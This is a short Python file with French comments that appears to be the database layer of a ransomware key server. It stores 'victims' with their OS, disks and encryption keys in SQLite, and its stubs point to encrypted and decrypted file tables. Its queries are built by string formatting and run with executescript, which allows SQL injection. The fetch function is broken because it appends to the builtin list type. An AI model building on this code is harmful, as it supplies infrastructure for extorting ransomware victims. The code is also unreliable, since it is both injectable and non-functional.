import sqlite3
connexion = sqlite3.connect("../serveur_cles/data/victims.sqlite")  #BDD dans le fichie

curseur = connexion.cursor()  #Récupération d'un curseur

#ajouter dans la bd
def ajoutvictim( id, os, hash, disk, key):
    sqlAjoutVictim=f'INSERT INTO victims (id_victim, os, hash, disks, key) VALUES ( "{id}", "{os}", "{hash}", "{disk}", "{key}")'
    print(sqlAjoutVictim)
    curseur.executescript(sqlAjoutVictim)
    connexion.commit()
'''def ajoutdecrypted(id, idvic,date, file):
    sqlAjoutDecrypted=f'INSERT INTO decrypted (id_decryped, id_victim, datetime, nb_file) VALUES ("{id}", "{idvic}", "{date}", "{file}")'
    print(sqlAjoutDecrypted)
    curseur.executescript(sqlAjoutDecrypted)
    connexion.commit()'''
#def ajoutstates( id_state,id_victim ,datetime ,nb_file):
#def ajoutencrypted(id_encrypted, id_victim, datetime, nb_file):

#chercher dans la bd
#python
def recup_data_victime(id=False):
    if not id:
        curseur.execute("SELECT * FROM victims")
        resultats = curseur.fetchall()
        for resultat in resultats:
            list.append(resultat)
        return list
    else:
        curseur.execute(f"SELECT * FROM victims WHERE id_victim ={id}")
        resultats = curseur.fetchone()
        for resultat in resultats:
            list.append(resultat)
        return list
ajoutvictim(1,"linux","oui","E","52414589")
connexion.close()  #Déconnexion

